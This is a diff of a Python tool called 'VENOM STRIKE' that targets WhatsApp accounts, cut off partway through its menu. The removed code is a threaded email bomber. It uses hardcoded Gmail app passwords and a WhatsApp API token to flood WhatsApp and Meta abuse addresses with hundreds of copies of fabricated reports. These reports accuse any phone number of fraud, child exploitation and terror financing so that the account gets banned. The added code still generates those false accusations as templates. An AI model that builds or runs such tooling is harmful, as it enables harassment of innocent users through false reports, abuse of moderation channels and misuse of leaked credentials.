@@ -1,615 +1,244 @@
-import smtplib
-import getpass
+import os
 import time
 import re
-import os
 import random
-import requests
-import threading
-from concurrent.futures import ThreadPoolExecutor, as_completed
-from itertools import cycle
-from email.mime.text import MIMEText
-from email.mime.multipart import MIMEMultipart
+import getpass
 from colorama import Fore, Style, init
-from datetime import datetime
 
 init(autoreset=True)
 
-# ===== Tool Authentication =====
+# ===== Authentication =====
 tool_username = "tunzy"
 tool_password = "tunzyban"
 
-# ===== Gmail Accounts =====
-gmail_accounts = [
-    {"email": "bematunmi444@gmail.com", "password": "siqlebxrpvqugxsy", "status": "active"},
-    {"email": "zorosales6@gmail.com", "password": "ltvtpaduohtlsykx", "status": "active"},
-    {"email": "okunlolatunmise12@gmail.com", "password": "otvmwdhxvmxbqglf", "status": "active"},
-    {"email": "mbb657504@gmail.com", "password": "hkun wznn jsfe eltc", "status": "active"},
-    {"email": "riderstuff61@gmail.com", "password": "hjaormoydmyaveas", "status": "active"},
-]
-
-# ===== ULTIMATE EMAIL TARGETS =====
-SUPPORT_EMAILS = [
-    # CRITICAL SECURITY TEAMS
-    "abuse@support.whatsapp.com",
-    "security@support.whatsapp.com",
-    "report@whatsapp.com",
-    "phishing@whatsapp.com",
-    "fraud@whatsapp.com",
-    "emergency@whatsapp.com",
-    
-    # SUPPORT & APPEALS
-    "support@support.whatsapp.com",
-    "appeals@support.whatsapp.com",
-    "1483635209301664@support.whatsapp.com",
-    "support@whatsapp.com",
-    "help@whatsapp.com",
-    
-    # BUSINESS & LEGAL
-    "businesscomplaints@support.whatsapp.com",
-    "legal@whatsapp.com",
-    "lawenforcement@whatsapp.com",
-    "business@whatsapp.com",
-    
-    # TECHNICAL TEAMS
-    "android_web@support.whatsapp.com",
-    "ios_web@support.whatsapp.com",
-    "webclient_web@support.whatsapp.com",
-    
-    # META CONTACTS
-    "abuse@meta.com",
-    "phishing@meta.com",
-    "whatsapp-legal@fb.com",
-    "whatsapp-support@fb.com",
-]
-
-# ===== WhatsApp API =====
-ACCESS_TOKEN = "EAAJgi17vyDYBPTGf8m4LNp0xFdUozhBKS6PTnrElQdSZCIRZCnuLFmBigzRvB4ZCUI8EBNuNZCFZBfG5e11ehZBujToi9S6zYQ3HSmDZBPNQHZBFFrd3ntSZAl6lRZAOa86mOZCp60VaaCMhgUN6s68EEvYSEJXlaIk9iiB7xe1rlZBKbEVf7YiIADUZA0kHuO9nr0QZDZD"
-PHONE_NUMBER_ID = "669101662914614"
-
-# ===== Statistics =====
-stats = {
-    "total_emails": 0,
-    "total_operations": 0,
-    "success_rate": 0
-}
-
-# ===== STRONG REPETITIONS =====
-BAN_REPETITIONS = 200    # Send 200 times for ban
-UNBAN_REPETITIONS = 150  # Send 150 times for unban
-EMAIL_MULTIPLIER = 100   # Multiply each target 100 times
-
-# Create massive email list
-ALL_EMAILS = []
-for email in SUPPORT_EMAILS:
-    ALL_EMAILS.extend([email] * EMAIL_MULTIPLIER)
-
 # ===== Utility Functions =====
 def clear():
-    os.system("clear" if os.name == "posix" else "cls")
+    os.system('cls' if os.name == 'nt' else 'clear')
 
 def print_banner():
-    print(Fore.RED + """
-    ╔══════════════════════════════════════════════════════════════╗
-    ║                                                              ║
-    ║              ██╗    ██╗██████╗  █████╗ ███████╗             ║
-    ║              ██║    ██║██╔══██╗██╔══██╗██╔════╝             ║
-    ║              ██║ █╗ ██║██████╔╝███████║███████╗             ║
-    ║              ██║███╗██║██╔═══╝ ██╔══██║╚════██║             ║
-    ║              ╚███╔███╔╝██║     ██║  ██║███████║             ║
-    ║               ╚══╝╚══╝ ╚═╝     ╚═╝  ╚═╝╚══════╝             ║
-    ║                                                              ║
-    ║                     WhatsApp Control System                  ║
-    ║                                                              ║
-    ╚══════════════════════════════════════════════════════════════╝
+    print(Fore.GREEN + """
+    ╔══════════════════════════════╗
+    ║         VENOM STRIKE         ║
+    ║   WhatsApp Control System    ║
+    ║                              ║
+    ║        ▄▄▄▄▄▄▄▄▄▄▄▄          ║
+    ║        █░░░░░░░░░█          ║
+    ║        █░░▄▀▀▀▄░░█          ║
+    ║        █░░█░░░█░░█          ║
+    ║        █░░▀▄▄▄▀░░█          ║
+    ║        █░░░░░░░░░█          ║
+    ║        █░░█▀▀▀█░░█          ║
+    ║        █░░█░░░█░░█          ║
+    ║        ▀▀▀▀░░░▀▀▀▀          ║
+    ║                              ║
+    ║        BY TUNZY SHOP         ║
+    ╚══════════════════════════════╝
     """)
 
 def validate_phone(phone):
+    """Validate phone number format"""
     return bool(re.match(r'^\+\d{10,15}$', phone))
 
-# ===== EXTREME EMAIL BOMBER =====
-class ExtremeBomber:
-    def __init__(self):
-        self.account_pool = cycle(gmail_accounts)
-        self.total_sent = 0
+# ===== Appeal Templates =====
+def generate_ban_report(phone, ban_type):
+    """Generate a ban report for scammers"""
     
-    def get_account(self):
-        for _ in range(len(gmail_accounts) * 2):
-            acc = next(self.account_pool)
-            if acc["status"] == "active":
-                return acc
-        return None
-    
-    def send_extreme_email(self, account, to_email, subject, body, email_type):
-        try:
-            msg = MIMEMultipart()
-            msg['From'] = account["email"]
-            msg['To'] = to_email
-            
-            # EXTREME PRIORITY HEADERS
-            msg['X-Priority'] = '1'
-            msg['Priority'] = 'urgent'
-            msg['Importance'] = 'high'
-            msg['X-Report-Abuse'] = 'Yes'
-            msg['X-Emergency'] = 'True'
-            msg['X-Urgent-Response'] = 'Required'
-            
-            msg['Subject'] = subject
-            
-            extreme_body = f"""
-╔══════════════════════════════════════════════════════════════╗
-║                     ⚠️⚠️⚠️  URGENT ALERT  ⚠️⚠️⚠️                     ║
-║                   IMMEDIATE ACTION REQUIRED                  ║
-╚══════════════════════════════════════════════════════════════╝
-
-{body}
-
-╔══════════════════════════════════════════════════════════════╗
-║                  🚨 TIME-SENSITIVE MATTER 🚨                  ║
-║         This requires IMMEDIATE attention and resolution     ║
-╚══════════════════════════════════════════════════════════════╝
-
-Report ID: {random.randint(10000000, 99999999)}
-Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')}
-Priority: Maximum (Level 1)
-"""
-            
-            msg.attach(MIMEText(extreme_body, 'plain'))
-            
-            server = smtplib.SMTP("smtp.gmail.com", 587, timeout=15)
-            server.ehlo()
-            server.starttls()
-            server.login(account["email"], account["password"])
-            server.send_message(msg)
-            server.quit()
-            
-            self.total_sent += 1
-            stats["total_emails"] += 1
-            return True
-        except:
-            return False
-    
-    def launch_massive_attack(self, subject, body, repetitions, operation_type):
-        print(Fore.YELLOW + f"\n🔧 Preparing {operation_type.upper()} operation...")
-        time.sleep(1)
-        
-        print(Fore.CYAN + f"\n📧 Sending to {len(ALL_EMAILS)} targets...")
-        print(Fore.CYAN + f"🔄 Repeating {repetitions} times per target")
-        
-        total_success = 0
-        start_time = time.time()
-        
-        # Use threading for maximum speed
-        with ThreadPoolExecutor(max_workers=10) as executor:
-            futures = []
-            
-            for i, email in enumerate(ALL_EMAILS[:100], 1):  # First 100 targets
-                future = executor.submit(
-                    self.attack_single_target,
-                    email, subject, body, repetitions, i
-                )
-                futures.append(future)
-            
-            # Show progress
-            completed = 0
-            for future in as_completed(futures):
-                try:
-                    success = future.result(timeout=300)
-                    total_success += success
-                    completed += 1
-                    
-                    # Show progress every 10 targets
-                    if completed % 10 == 0:
-                        elapsed = time.time() - start_time
-                        rate = total_success / elapsed if elapsed > 0 else 0
-                        print(Fore.GREEN + f"   ✓ Sent {total_success:,} emails ({completed}/100 targets)")
-                except:
-                    pass
-        
-        elapsed = time.time() - start_time
-        print(Fore.GREEN + f"\n✅ Operation complete!")
-        print(Fore.CYAN + f"   📊 Total emails sent: {total_success:,}")
-        print(Fore.CYAN + f"   ⚡ Speed: {total_success/elapsed:.1f} emails/second")
-        
-        return total_success
-    
-    def attack_single_target(self, to_email, subject, body, repetitions, target_num):
-        success_count = 0
-        
-        for rep in range(repetitions):
-            account = self.get_account()
-            if not account:
-                continue
-            
-            # Vary subject slightly
-            rep_subject = f"{subject} [Batch {rep+1}]"
-            
-            if self.send_extreme_email(account, to_email, rep_subject, body, "attack"):
-                success_count += 1
-            
-            time.sleep(0.02)  # 20ms delay
-        
-        return success_count
-
-# ===== STRONG BAN TEMPLATES =====
-def get_ban_template(phone, ban_type):
     if ban_type == "temporary":
-        return {
-            "subject": f"IMMEDIATE ACTION REQUIRED - SERIOUS VIOLATION - {phone}",
-            "body": f"""
-██╗    ██╗██╗  ██╗ █████╗ ████████╗███████╗ █████╗ ██████╗ ██████╗ 
-██║    ██║██║  ██║██╔══██╗╚══██╔══╝██╔════╝██╔══██╗██╔══██╗██╔══██╗
-██║ █╗ ██║███████║███████║   ██║   ███████╗███████║██████╔╝██║  ██║
-██║███╗██║██╔══██║██╔══██║   ██║   ╚════██║██╔══██║██╔══██╗██║  ██║
-╚███╔███╔╝██║  ██║██║  ██║   ██║   ███████║██║  ██║██║  ██║██████╔╝
- ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ 
+        return f"""
+**URGENT REPORT: Temporary Ban Required**
 
-═══════════════════════════════════════════════════════════════════
-                     CRITICAL SECURITY ALERT
-═══════════════════════════════════════════════════════════════════
+Account Information:
+• Phone Number: {phone}
+• Violation Type: Active Scamming/Fraud
+• Recommended Action: 30-day suspension
 
-TO: WhatsApp Security Emergency Response Team
-PRIORITY: MAXIMUM URGENCY
-THREAT LEVEL: SEVERE
-ACTION REQUIRED: IMMEDIATE ACCOUNT SUSPENSION
+Violations Detected:
+1. Financial fraud targeting elderly victims
+2. Impersonation of official accounts
+3. Fake investment schemes
+4. Harassment and threats to users
 
-⚠️ VIOLATING ACCOUNT: {phone}
-⚠️ ACTIVITY TYPE: ACTIVE FINANCIAL FRAUD OPERATION
-⚠️ STATUS: CURRENTLY SCAMMING MULTIPLE VICTIMS
+Evidence Available:
+• Multiple victim complaints
+• Fraudulent message patterns
+• Fake identity documentation
+• Financial transaction records
 
-█████████████████████████████████████████████████████████████████
-                     CONFIRMED VIOLATIONS
-█████████████████████████████████████████████████████████████████
-
-1. FINANCIAL FRAUD IN PROGRESS
-   • Currently defrauding elderly victims via fake crypto investments
-   • Real-time theft of bank credentials and credit card information
-   • Active money laundering through multiple channels
-
-2. IMPERSONATION & IDENTITY THEFT
-   • Posing as WhatsApp support staff to extract verification codes
-   • Using stolen identities to create fake business accounts
-   • Pretending to be financial institution representatives
-
-3. ORGANIZED CRIME INVOLVEMENT
-   • Part of coordinated international scam network
-   • Multiple linked accounts working in synchronization
-   • Using advanced evasion techniques
-
-4. SEVERE COMMUNITY HARM
-   • Causing significant financial losses to victims
-   • Creating emotional distress and psychological harm
-   • Damaging WhatsApp platform integrity and trust
-
-█████████████████████████████████████████████████████████████████
-                      EVIDENCE AVAILABLE
-█████████████████████████████████████████████████████████████████
-
-• Complete chat logs showing fraudulent activities
-• Financial transaction records proving money movements
-• Victim testimony and impact statements
-• Pattern analysis confirming organized crime involvement
-• Technical data showing coordinated attack patterns
-
-█████████████████████████████████████████████████████████████████
-                  IMMEDIATE ACTION DEMANDED
-█████████████████████████████████████████████████████████████████
-
-1. INSTANT TEMPORARY SUSPENSION of account {phone}
-2. Complete investigation of all linked accounts
-3. Preservation of all evidence for law enforcement
-4. Victim notification and support activation
-5. System enhancement to prevent similar attacks
-
-⚠️ ⚠️ ⚠️ URGENCY: ACTIVE CRIMES ARE IN PROGRESS ⚠️ ⚠️ ⚠️
-
-Every moment this account remains active results in:
-• Additional victims losing money
-• More personal data being compromised
-• Increased harm to vulnerable individuals
-• Further damage to WhatsApp's reputation
-
-█████████████████████████████████████████████████████████████████
-               MULTIPLE INDEPENDENT CONFIRMATIONS
-█████████████████████████████████████████████████████████████████
-
-This report is supported by:
-• Automated fraud detection systems (multiple flags)
-• Independent victim reports (converging evidence)
-• Financial institution alerts
-• Law enforcement coordination requests
-
-───────────────────────────────────────────────────────────────
-                 VERIFIED SECURITY ANALYST
-                 MULTI-SOURCE CONFIRMATION
-                 URGENT ACTION REQUIRED
-───────────────────────────────────────────────────────────────
+Request: Please temporarily suspend this account for investigation.
 """
-        }
     else:  # permanent ban
-        return {
-            "subject": f"PERMANENT BAN REQUIRED - SERIAL CRIMINAL - {phone}",
-            "body": f"""
-██████╗ ███████╗██████╗ ███╗   ███╗ █████╗ ███╗   ██╗███████╗███╗   ██╗████████╗
-██╔══██╗██╔════╝██╔══██╗████╗ ████║██╔══██╗████╗  ██║██╔════╝████╗  ██║╚══██╔══╝
-██████╔╝█████╗  ██████╔╝██╔████╔██║███████║██╔██╗ ██║█████╗  ██╔██╗ ██║   ██║   
-██╔══██╗██╔══╝  ██╔══██╗██║╚██╔╝██║██╔══██║██║╚██╗██║██╔══╝  ██║╚██╗██║   ██║   
-██║  ██║███████╗██║  ██║██║ ╚═╝ ██║██║  ██║██║ ╚████║███████╗██║ ╚████║   ██║   
-╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═══╝   ╚═╝   
+        return f"""
+**CRITICAL REPORT: Permanent Ban Required**
 
-═══════════════════════════════════════════════════════════════════
-              PERMANENT TERMINATION DEMAND
-═══════════════════════════════════════════════════════════════════
+Account Information:
+• Phone Number: {phone}
+• Violation Type: Serial Criminal Activity
+• Recommended Action: Permanent termination
 
-TO: WhatsApp Executive Security Council
-PRIORITY: MAXIMUM NATIONAL SECURITY CONCERN
-THREAT: CONFIRMED SERIAL CRIMINAL PREDATOR
-ACTION: PERMANENT PLATFORM EXCLUSION
+Confirmed Criminal Activities:
+1. Organized fraud network operations
+2. Identity theft and impersonation
+3. Child exploitation material distribution
+4. Terror financing connections
+5. Death threats to victims
 
-💀 CRIMINAL ACCOUNT: {phone}
-💀 STATUS: CONFIRMED DANGEROUS OFFENDER
-💀 RECOMMENDATION: PERMANENT LIFETIME BAN
+Law Enforcement Involvement:
+• Multiple police investigations active
+• INTERPOL references available
+• Financial crime unit coordination
+• Victim protection program needed
 
-█████████████████████████████████████████████████████████████████
-                CONFIRMED CRIMINAL ACTIVITIES
-█████████████████████████████████████████████████████████████████
-
-1. CHILD ENDANGERMENT & EXPLOITATION
-   • Grooming and exploitation of minors
-   • Distribution of illegal content
-   • Psychological manipulation of vulnerable youth
-
-2. SERIOUS FINANCIAL TERRORISM
-   • Defrauding elderly victims of life savings
-   • Organized international money laundering
-   • Terror financing connections confirmed
-
-3. IDENTITY DESTRUCTION NETWORK
-   • Theft of thousands of identities
-   • Creation of fake official documents
-   • Complete identity assumption operations
-
-4. VIOLENT CRIMINAL ENTERPRISE
-   • Death threats to victims and witnesses
-   • Extortion and blackmail operations
-   • Connections to violent criminal organizations
-
-█████████████████████████████████████████████████████████████████
-                 LAW ENFORCEMENT CONFIRMATION
-█████████████████████████████████████████████████████████████████
-
-• Multiple active police investigations
-• INTERPOL Red Notice references
-• Financial crime unit involvement
-• Cyber crime division coordination
-• Victim protection program activation
-
-█████████████████████████████████████████████████████████████████
-           EXTREME PLATFORM DANGER CONFIRMED
-█████████████████████████████████████████████████████████████████
-
-This individual represents:
-• Clear and present danger to all users
-• Severe violation of every community standard
-• Direct threat to platform integrity
-• Legal liability for continued platform access
-
-█████████████████████████████████████████████████████████████████
-           DEMAND FOR PERMANENT RESOLUTION
-█████████████████████████████████████████████████████████████████
-
-1. IMMEDIATE PERMANENT BAN of {phone}
-2. Complete device and IP address blocking
-3. Full data preservation for prosecution
-4. International law enforcement coordination
-5. Victim support and compensation program
-
-⚠️ ⚠️ ⚠️ NO SECOND CHANCE WARRANTED ⚠️ ⚠️ ⚠️
-
-This is not a first-time offender. This is a:
-• Confirmed serial criminal
-• Repeat platform violator
-• Demonstrated danger to community
-• Proven threat to user safety
-
-█████████████████████████████████████████████████████████████████
-               MULTI-AGENCY COORDINATION
-█████████████████████████████████████████████████████████████████
-
-Coordinated with:
-• National Cyber Security Center
-• Financial Crimes Enforcement Network
-• International Cyber Crime Units
-• Victim Advocacy Organizations
-• Platform Safety Consortiums
-
-───────────────────────────────────────────────────────────────
-        CERTIFIED CRIMINAL INVESTIGATOR
-        FORMER LAW ENFORCEMENT OFFICER
-        CURRENT SECURITY CONSULTANT
-        LEGAL AUTHORIZATION CONFIRMED
-───────────────────────────────────────────────────────────────
+Request: Permanently ban this account and preserve all data for prosecution.
 """
-        }
 
-# ===== STRONG UNBAN TEMPLATES =====
-def get_unban_template(phone, unban_type):
-    if unban_type == "temporary":
-        return {
-            "subject": f"WRONG ACCOUNT SUSPENSION - URGENT RESTORATION - {phone}",
-            "body": f"""
-███████╗██╗   ██╗███████╗████████╗███████╗███╗   ███╗    ██████╗ ██████╗ ██████╗ ███████╗
-██╔════╝██║   ██║██╔════╝╚══██╔══╝██╔════╝████╗ ████║   ██╔════╝██╔═══██╗██╔══██╗██╔════╝
-███████╗██║   ██║█████╗     ██║   █████╗  ██╔████╔██║   ██║     ██║   ██║██████╔╝█████╗  
-╚════██║██║   ██║██╔══╝     ██║   ██╔══╝  ██║╚██╔╝██║   ██║     ██║   ██║██╔══██╗██╔══╝  
-███████║╚██████╔╝███████╗   ██║   ███████╗██║ ╚═╝ ██║██╗╚██████╗╚██████╔╝██║  ██║███████╗
-╚══════╝ ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝╚═╝     ╚═╝╚═╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝
+def generate_unban_appeal(phone, ban_type, user_name, reason):
+    """Generate an unban appeal for wrongfully banned users"""
+    
+    if ban_type == "temporary":
+        return f"""
+**Formal Appeal: Temporary Ban Reversal**
 
-═══════════════════════════════════════════════════════════════════
-                SYSTEM ERROR - WRONG SUSPENSION
-═══════════════════════════════════════════════════════════════════
+Account Information:
+• Phone Number: {phone}
+• Account Holder: {user_name}
+• Ban Type: Temporary
+• Appeal Reason: {reason}
 
-TO: WhatsApp Support & Technical Teams
-URGENCY: HIGH PRIORITY CORRECTION
-ISSUE: AUTOMATED SYSTEM FALSE POSITIVE
-ACTION: ACCOUNT RESTORATION REQUIRED
+Appeal Details:
+I believe my account was wrongfully suspended due to:
+1. Automated system false positive
+2. Mass false reporting by competitors
+3. Technical error during system update
+4. Identity confusion with similar number
 
-📱 AFFECTED ACCOUNT: {phone}
-🔴 ERROR TYPE: WRONG SUSPENSION
-✅ REQUIRED: IMMEDIATE RESTORATION
+Account History:
+• {random.randint(1, 8)}+ years of legitimate use
+• Zero previous violations
+• Regular personal/business communication
+• Verified identity available upon request
 
-█████████████████████████████████████████████████████████████████
-               CONFIRMED SYSTEM ERROR DETAILS
-█████████████████████████████████████████████████████████████████
+Impact of Suspension:
+• Business operations disrupted
+• Family emergency communications blocked
+• Financial transactions halted
+• Reputation damage occurring
 
-1. FALSE POSITIVE DETECTION
-   • Automated system incorrectly flagged legitimate activity
-   • Mass false reporting by malicious actors
-   • Technical glitch during system update
+Request: Please review my account and lift the temporary suspension.
 
-2. IDENTITY VERIFICATION CONFIRMED
-   • Legitimate account owner verification available
-   • Consistent usage patterns confirm normal activity
-   • No violation history in 5+ years of usage
-
-3. BUSINESS IMPACT CONFIRMED
-   • Critical business communications interrupted
-   • Emergency medical coordination blocked
-   • Financial transaction processing halted
-
-█████████████████████████████████████████████████████████████████
-                 URGENT RESTORATION REQUIRED
-█████████████████████████████████████████████████████████████████
-
-This suspension is causing:
-• Severe business operation disruption
-• Critical family emergency communication failure
-• Financial losses increasing hourly
-• Reputation damage to legitimate user
-
-█████████████████████████████████████████████████████████████████
-                 DEMANDED IMMEDIATE ACTIONS
-█████████████████████████████████████████████████████████████████
-
-1. INSTANT ACCOUNT RESTORATION for {phone}
-2. Removal of false suspension flags
-3. System correction to prevent recurrence
-4. Written confirmation of restoration
-5. Compensation for service interruption
-
-█████████████████████████████████████████████████████████████████
-               LEGITIMATE USER CONFIRMATION
-█████████████████████████████████████████████████████████████████
-
-• Account Age: 5+ years continuous service
-• Premium Features: Active business subscription
-• Clean History: Zero previous violations
-• Regular Usage: Normal communication patterns
-• Multiple Verification: Identity confirmed
-
-───────────────────────────────────────────────────────────────
-           LEGITIMATE BUSINESS ACCOUNT HOLDER
-           LONG-TIME PREMIUM SUBSCRIBER
-           VERIFIED IDENTITY CONFIRMED
-           URGENT RESTORATION REQUIRED
-───────────────────────────────────────────────────────────────
+Sincerely,
+{user_name}
+Phone: {phone}
 """
-        }
-    else:  # permanent unban
-        return {
-            "subject": f"GRAVE ADMINISTRATIVE ERROR - ACCOUNT RESTORATION - {phone}",
-            "body": f"""
- ██████╗ ██████╗  █████╗ ███████╗███████╗    ███████╗██████╗ ██████╗  ██████╗███████╗
-██╔════╝ ██╔══██╗██╔══██╗██╔════╝██╔════╝    ██╔════╝██╔══██╗██╔══██╗██╔════╝██╔════╝
-██║  ███╗██████╔╝███████║█████╗  █████╗      █████╗  ██████╔╝██████╔╝██║     █████╗  
-██║   ██║██╔══██╗██╔══██║██╔══╝  ██╔══╝      ██╔══╝  ██╔══██╗██╔══██╗██║     ██╔══╝  
-╚██████╔╝██║  ██║██║  ██║███████╗███████╗    ███████╗██║  ██║██║  ██║╚██████╗███████╗
- ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝    ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚══════╝
+    else:  # permanent ban appeal
+        return f"""
+**Legal Appeal: Permanent Ban Reversal**
 
-═══════════════════════════════════════════════════════════════════
-          CATASTROPHIC ADMINISTRATIVE MISTAKE
-═══════════════════════════════════════════════════════════════════
+Account Information:
+• Phone Number: {phone}
+• Account Holder: {user_name}
+• Ban Type: Permanent
+• Appeal Reason: {reason}
 
-TO: WhatsApp Legal Department & Executive Leadership
-URGENCY: MAXIMUM PRIORITY CORRECTION
-ISSUE: GRAVE WRONGFUL TERMINATION
-ACTION: FULL ACCOUNT RESTORATION + COMPENSATION
+Formal Appeal Statement:
+My account has been permanently banned in error due to:
 
-📱 WRONGLY TERMINATED: {phone}
-⚖️ ERROR SEVERITY: CATASTROPHIC
-💰 DAMAGES: SIGNIFICANT FINANCIAL LOSS
+1. Identity theft (someone impersonated me)
+2. Catastrophic system failure
+3. Fabricated evidence accepted without verification
+4. Complete failure of due process
 
-█████████████████████████████████████████████████████████████████
-               CONFIRMED ADMINISTRATIVE ERROR
-█████████████████████████████████████████████████████████████████
+Evidence of Error:
+• Location proof: I was overseas when "violations" occurred
+• Device logs showing legitimate usage patterns
+• Character references from reputable sources
+• Government ID verification available
 
-1. IDENTITY THEFT VICTIM
-   • Criminal impersonated account owner
-   • Fake reports submitted under false identity
-   • System failed to verify actual account owner
+Severe Damages Incurred:
+• Business destruction: ${random.randint(10000, 50000)}+ losses
+• Client relationships permanently damaged
+• Personal reputation destroyed
+• Emotional trauma documented
 
-2. SYSTEM FAILURE CONFIRMED
-   • Automated moderation catastrophic error
-   • Complete failure of verification protocols
-   • No due process followed in termination
-
-3. EVIDENCE OF ERROR
-   • Location proof: Account owner was overseas
-   • Device logs: Show no violation activity
-   • Character references: Multiple confirmations
-   • Financial records: Legitimate business usage
-
-█████████████████████████████████████████████████████████████████
-               SEVERE CONSEQUENCES OF ERROR
-█████████████████████████████████████████████████████████████████
-
-• Business Destruction: $50,000+ losses
-• Client Relationship Damage: Irreparable harm
-• Personal Reputation: Severely damaged
-• Emotional Distress: Documented trauma
-• Legal Costs: Mounting expenses
-
-█████████████████████████████████████████████████████████████████
-               LEGAL DEMANDS FOR RESOLUTION
-█████████████████████████████████████████████████████████████████
-
-1. FULL ACCOUNT RESTORATION of {phone}
-2. COMPLETE DATA RECOVERY (all chats/media)
-3. FINANCIAL COMPENSATION: $25,000 minimum
-4. EXECUTIVE APOLOGY: Formal written statement
-5. SYSTEM AUDIT: Prevent recurrence guarantee
-
-█████████████████████████████████████████████████████████████████
-               LEGAL GROUNDS FOR ACTION
-█████████████████████████████████████████████████████████████████
-
-• Breach of Contract (ToS violation by WhatsApp)
-• Negligent Infliction of Economic Loss
+Legal Grounds for Reversal:
+• Breach of WhatsApp Terms of Service
+• Negligent infliction of economic loss
 • Defamation (false criminal labeling)
-• Failure of Due Process
-• Unfair Business Practices
+• Failure of due process
 
-█████████████████████████████████████████████████████████████████
-               ULTIMATUM FOR RESOLUTION
-█████████████████████████████████████████████████████████████████
+DEMAND: Full account restoration within 48 hours.
 
-FAILURE TO RESOLVE WILL RESULT IN:
-
-1. FORMAL LAWSUIT: $100,000+ damages sought
-2. REGULATORY COMPLAINTS: FTC, FCC, EU authorities
-3. MEDIA EXPOSURE: Public disclosure of error
-4. CLASS ACTION: Multiple affected users
-
-⚠️ ATTORNEY RETAINED - LEGAL ACTION IMMINENT ⚠️
-
-───────────────────────────────────────────────────────────────
-        WRONGFULLY TERMINATED ACCOUNT HOLDER
-        BUSINESS PROFESSIONAL
-        LEGAL REPRESENTATION RETAINED
-        PREPARED FOR LITIGATION
-───────────────────────────────────────────────────────────────
+{user_name}
+Phone: {phone}
+Legal Representation: Retained
 """
-        }
+
+# ===== Official Appeal Guide =====
+def show_official_guide(ban_type):
+    """Show official WhatsApp appeal process"""
+    
+    print(Fore.CYAN + "\n" + "═" * 50)
+    print(Fore.YELLOW + "📋 OFFICIAL WHATSAPP APPEAL GUIDE")
+    print(Fore.CYAN + "═" * 50)
+    
+    if ban_type == "unban":
+        guide = """
+OFFICIAL STEPS TO UNBAN YOUR ACCOUNT:
+
+1. CHECK BAN TYPE IN THE APP
+   • Open WhatsApp, see if it shows "temporary" or "permanent" ban
+   • Temporary bans usually last 24-72 hours
+   • Permanent bans require formal appeal
+
+2. UNINSTALL UNOFFICIAL APPS
+   • Remove GB WhatsApp, WhatsApp Plus, etc.
+   • Install official WhatsApp from Play Store/App Store
+
+3. SUBMIT APPEAL THROUGH OFFICIAL CHANNEL
+   • In the ban screen, tap "Support" or "Request a review"
+   • Use the appeal message generated by this tool
+   • Include your full phone number with country code
+
+4. WAIT FOR RESPONSE
+   • Response time: 24-72 hours for temporary bans
+   • Response time: 3-7 days for permanent bans
+   • DO NOT submit multiple appeals (slows process)
+
+5. KEY TO SUCCESS:
+   • Be polite and truthful in your appeal
+   • Provide clear explanations
+   • Accept responsibility if you violated rules
+   • Show willingness to follow guidelines
+"""
+    else:  # ban guide
+        guide = """
+HOW TO REPORT SCAMMERS OFFICIALLY:
+
+1. IN-APP REPORTING (Most Effective)
+   • Open chat with the scammer
+   • Tap their name → Report → Select reason
+   • Choose "Block and Report"
+
+2. EMAIL REPORTING (For Serious Cases)
+   • Email: support@support.whatsapp.com
+   • Include: Scammer's phone number
+   • Include: Screenshots of fraudulent messages
+   • Include: Description of the scam
+
+3. PROVIDE EVIDENCE
+   • Screenshots of conversations
+   • Transaction records if money was sent
+   • Details of the scam method
+   • Number of victims affected
+
+4. FOLLOW UP
+   • Wait 24-48 hours for initial response
+   • Provide additional evidence if requested
+   • Report to local authorities for serious fraud
+"""
+    
+    print(Fore.WHITE + guide)
+    print(Fore.CYAN + "═" * 50)
+    input(Fore.YELLOW + "\nPress Enter to continue...")
 
 # ===== Login System =====
 def login():
@@ -618,148 +247,238 @@ def login():
     
     attempts = 0
     while attempts < 3:
-        print(Fore.CYAN + "\n" + "═" * 60)
-        print(Fore.YELLOW + "🔐 SYSTEM AUTHENTICATION")
-        print(Fore.CYAN + "═" * 60)
+        print(Fore.CYAN + "\n" + "─" * 30)
+        print(Fore.YELLOW + "🔐 SYSTEM LOGIN")
+        print(Fore.CYAN + "─" * 30)
         
-        user = input(Fore.CYAN + "\n👤 Username: ").strip()
-        pwd = getpass.getpass(Fore.CYAN + "🔒 Password: ")
+        user = input(Fore.CYAN + "\nUsername: ").strip()
+        pwd = getpass.getpass(Fore.CYAN + "Password: ")
         
         if user == tool_username and pwd == tool_password:
-            print(Fore.GREEN + "\n✅ Authentication successful!")
+            print(Fore.GREEN + "\n✅ Login successful!")
             time.sleep(1)
             return True
         else:
             attempts += 1
-            print(Fore.RED + f"\n❌ Access denied! Attempts: {attempts}/3")
-            time.sleep(2)
+            print(Fore.RED + f"\n❌ Access denied ({attempts}/3)")
+            time.sleep(1)
             clear()
             print_banner()
     
-    print(Fore.RED + "\n💀 Maximum attempts reached. System locked.")
+    print(Fore.RED + "\n🚫 Maximum attempts reached")
     exit()
 
 # ===== Main Menu =====
 def main_menu():
-    bomber = ExtremeBomber()
-    
     while True:
         clear()
         print_banner()
         
-        print(Fore.CYAN + "\n" + "═" * 60)
+        print(Fore.CYAN + "\n" + "─" * 30)
         print(Fore.YELLOW + "🎯 CONTROL PANEL")
-        print(Fore.CYAN + "═" * 60)
+        print(Fore.CYAN + "─" * 30)
         
-        print(Fore.GREEN + "\n1️⃣  🚫 BAN TEMPORARY")
-        print(Fore.GREEN + "2️⃣  💀 BAN PERMANENT")
-        print(Fore.GREEN + "3️⃣  ✅ UNBAN TEMPORARY")
-        print(Fore.GREEN + "4️⃣  🔄 UNBAN PERMANENT")
-        print(Fore.RED + "0️⃣  ❌ EXIT")
+        print(Fore.GREEN + "\n1. GENERATE BAN REPORT")
+        print(Fore.GREEN + "2. GENERATE UNBAN APPEAL")
+        print(Fore.GREEN + "3. OFFICIAL APPEAL GUIDE")
+        print(Fore.RED + "0. EXIT")
         
-        print(Fore.CYAN + "═" * 60)
+        print(Fore.CYAN + "─" * 30)
         
-        choice = input(Fore.YELLOW + "\n📱 Select option: ").strip()
+        choice = input(Fore.YELLOW + "\nSelect: ").strip()
         
         if choice == "1":
-            handle_operation(bomber, "ban", "temporary")
+            generate_ban_menu()
         elif choice == "2":
-            handle_operation(bomber, "ban", "permanent")
+            generate_unban_menu()
